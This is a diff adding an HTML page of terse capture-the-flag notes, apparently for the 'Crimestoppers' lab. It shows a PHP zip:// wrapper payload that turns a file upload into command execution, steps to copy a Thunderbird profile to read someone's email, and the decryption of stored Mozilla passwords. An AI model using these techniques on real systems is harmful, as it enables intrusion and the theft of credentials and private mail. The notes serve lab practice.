@@ -1,0 +1,41 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Crimestoppers - PHP Filters Thunderbird IPTables v6</title>
+</head><body>Manually editing cookies for fun and Priv Esc in web apps<br/>
+If you have HTML viewing of PHP code AND access to php wrappers, you have a route to RCE<br/>
+In this case, zip:// because we can unzip a file to file.php and exec (other good wrappers are data:// and expect://<br/>
+<br/>
+PHP cmd shell in cmd.php<br/>
+zip cmd.zip cmd.php<br/>
+<br/>
+Upload through Burp:<br/>
+Base64 your payload, paste it into Burp, and then decode it<br/>
+This will ensure binary data remains in-tact<br/>
+<br/>
+payload=<br/>
+?op=zip://uploads/file#cmd&amp;ippsec=whoami<br/>
+<br/>
+the # is the phpcode appending '.php' due to how the website is coded, so cmd.php&amp;ippsec=whoami<br/>
+<br/>
+Copy profile from .thunderbird directory (zip and grab)<br/>
+Unzip in local .thunderbird directory. Edit profiles.ini and change the profile to the newly acquired one. <br/>
+Voila! Email access.<br/>
+<br/>
+Decrypt mozilla passwords (and in profile files like .thunderbird profiles):<br/>
+firefox_decrypt<br/>
+<br/>
+By default, no master passwords. <br/>
+<br/>
+Tip: checking iptables, look at the size of rules.v4 and rules.v6. It could be that IPv6 is not as locked down as IPv4!<br/>
+<br/>
+IPv6 can generally be placed in brackets for use with tools [IPv6]<br/>
+scp example:<br/>
+scp -6 user@[ip:v6::addr]:/tmp/file<br/>
+<br/>
+Finding "newer" files, modified between date and date<br/>
+find / -type f -newermt &lt;date&gt; ! -newermt &lt;date&gt;<br/>
+<br/>
+<br/>
+zcat...unzip and cat in one command</body></html>
